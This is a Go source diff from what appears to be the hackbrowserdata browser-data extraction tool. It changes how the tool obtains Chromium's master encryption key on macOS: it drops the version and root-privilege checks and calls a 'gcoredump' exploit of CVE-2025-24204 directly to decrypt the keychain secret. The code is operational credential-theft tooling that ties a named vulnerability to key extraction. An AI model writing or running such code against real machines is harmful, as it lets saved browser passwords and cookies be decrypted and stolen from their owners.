@@ -11,7 +11,7 @@ import (
 	"os/exec"
 	"strings"
 
-	"github.com/moond4rk/hackbrowserdata/browser/exploit/cve2025_24204"
+	"github.com/moond4rk/hackbrowserdata/browser/exploit/gcoredump"
 	"github.com/moond4rk/hackbrowserdata/crypto"
 	"github.com/moond4rk/hackbrowserdata/log"
 	"github.com/moond4rk/hackbrowserdata/types"
@@ -26,21 +26,15 @@ func (c *Chromium) GetMasterKey() ([]byte, error) {
 	// don't need chromium key file for macOS
 	defer os.Remove(types.ChromiumKey.TempFilename())
 
-	// Try get the master key via CVE-2025-24204
-	if cve2025_24204.GetMacOSVersion() == cve2025_24204.ExploitOSVersion {
-		if os.Geteuid() == 0 {
-			secret, err := cve2025_24204.DecryptKeychain(c.storage)
-			if err == nil {
-				log.Debugf("get master key via CVE-2025-24204 success, browser %s", c.name)
-				if key, err := c.parseSecret([]byte(secret)); err == nil {
-					return key, nil
-				}
-			}
-
-			log.Warnf("get master key via CVE-2025-24204 failed: %v", err)
-		} else {
-			log.Warnf("CVE-2025-24204 exploit requires root privileges, skipping...")
+	// Try get the master key via gcoredump(CVE-2025-24204)
+	secret, err := gcoredump.DecryptKeychain(c.storage)
+	if err == nil && secret != "" {
+		log.Debugf("get master key via gcoredump(CVE-2025-24204) success, browser %s", c.name)
+		if key, err := c.parseSecret([]byte(secret)); err == nil {
+			return key, nil
 		}
+	} else {
+		log.Warnf("get master key via gcoredump(CVE-2025-24204) failed: %v, skipping...", err)
 	}
 
 	// Get the master key from the keychain
